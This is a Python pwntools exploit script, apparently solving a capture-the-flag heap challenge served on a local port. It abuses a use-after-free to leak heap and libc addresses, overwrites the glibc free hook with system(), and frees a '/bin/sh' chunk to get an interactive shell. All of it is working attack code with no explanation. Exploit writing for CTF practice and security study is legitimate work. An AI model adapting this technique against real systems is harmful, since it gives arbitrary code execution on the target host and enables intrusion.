from pwn import *

# context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# io = gdb.debug("./chall_patched", "c")
# io = process("./chall_patched")
io = remote("localhost", 6008)


def create(idx, val):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Content: ", val)


def edit(idx, val):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"New Content: ", val)


def printstr(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())


def delete(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())


create(10, b"/bin/sh")

# ensure libc is on heap
create(15, b"a" * 0x500)
create(14, b"yyyy")  # no consolidate
printstr(15)

# uaf leak heap
create(0, b"a" * 16)
printstr(0)
create(1, b"b" * 16)
printstr(0)
io.recvuntil(b"Content: ")
heap_addr = int.from_bytes(io.recvn(6), "little")
print(f"{heap_addr = :#x}")
print(f"{heap_addr + 0x40 = :#x}")

# uaf leak libc
create(0, b"a" * 16)
printstr(0)
create(1, b"b" * 16)
edit(0, flat([heap_addr + 0x40, 0x100]))
printstr(1)
io.recvuntil(b"Content: ")
io.recvn(0x20)
libc_base = int.from_bytes(io.recvn(8), "little") - 0x1BEBE0
print(f"{libc_base = :#x}")


# uaf write
system = libc_base + 0x48E50
freehook = libc_base + 0x1C1E70
print(f"{system = :#x}")
print(f"{freehook = :#x}")
create(0, b"a" * 16)
printstr(0)
create(1, b"b" * 16)
edit(0, flat([freehook, 0x8]))
edit(1, p64(system))

# free("/bin/sh")
delete(10)

io.interactive()
